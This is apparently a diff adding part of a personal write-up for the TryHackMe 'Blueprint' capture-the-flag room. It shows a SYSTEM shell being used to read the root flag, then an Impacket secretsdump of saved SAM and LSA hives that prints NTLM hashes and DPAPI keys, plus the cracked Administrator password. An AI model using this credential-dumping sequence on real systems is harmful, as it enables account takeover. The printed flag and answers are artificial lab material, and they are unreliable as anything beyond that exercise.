@@ -82,3 +82,98 @@ RCE_SHELL$ whoami
 nt authority\system
 
 ```
+
+Since I was able to get an `nt authority\system` shell right away I decided to get the root flag immediately.
+Path to root.txt.txt
+```
+RCE_SHELL$ dir
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+
+09/26/2022  09:24 PM    <DIR>          .
+09/26/2022  09:24 PM    <DIR>          ..
+04/11/2019  10:52 PM               447 application.php
+09/26/2022  09:28 PM             1,118 configure.php
+04/11/2019  10:52 PM    <DIR>          functions
+               2 File(s)          1,565 bytes
+               3 Dir(s)  19,509,313,536 bytes free
+
+RCE_SHELL$ dir C:\Users
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\Users
+
+04/11/2019  11:36 PM    <DIR>          .
+04/11/2019  11:36 PM    <DIR>          ..
+04/11/2019  11:40 PM    <DIR>          Administrator
+03/21/2017  04:30 PM    <DIR>          DefaultAppPool
+03/21/2017  04:09 PM    <DIR>          Lab
+07/14/2009  05:41 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)  19,509,313,536 bytes free
+
+RCE_SHELL$ dir C:\Users\Administrator
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\Users\Administrator
+
+04/11/2019  11:40 PM    <DIR>          .
+04/11/2019  11:40 PM    <DIR>          ..
+04/11/2019  11:36 PM    <DIR>          Contacts
+11/27/2019  07:15 PM    <DIR>          Desktop
+04/11/2019  11:36 PM    <DIR>          Documents
+04/11/2019  11:45 PM    <DIR>          Downloads
+04/11/2019  11:36 PM    <DIR>          Favorites
+04/11/2019  11:36 PM    <DIR>          Links
+04/11/2019  11:36 PM    <DIR>          Music
+04/11/2019  11:36 PM    <DIR>          Pictures
+04/11/2019  11:36 PM    <DIR>          Saved Games
+04/11/2019  11:36 PM    <DIR>          Searches
+04/11/2019  11:36 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  19,509,313,536 bytes free
+
+RCE_SHELL$ dir C:\Users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/27/2019  07:15 PM    <DIR>          .
+11/27/2019  07:15 PM    <DIR>          ..
+11/27/2019  07:15 PM                37 root.txt.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  19,509,280,768 bytes free
+
+RCE_SHELL$ type C:\Users\Administrator\Desktop\root.txt.txt
+THM{aea1e3ce6fe7f89e10cea833ae009bee}
+
+```
+I used this walkthrough to get the needed hash for question #1
+https://systemweakness.com/blueprint-tryhackme-ctf-walkthrough-c71c27d6e652
+
+
+```
+└─$ python3 secretsdump.py -sam /home/gomez22/Blueprint/sam.save -security /home/gomez22/Blueprint/security.save -system /home/gomez22/Blueprint/system.save LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DefaultPassword 
+(Unknown User):malware
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x9bd2f17b538da4076bf2ecff91dddfa93598c280                  
+dpapi_userkey:0x251de677564f950bb643b8d7fdfafec784a730d1                     
+[*] Cleaning up...
+```
+
+crackstation.net cracked the hash and gave me `googleplus`
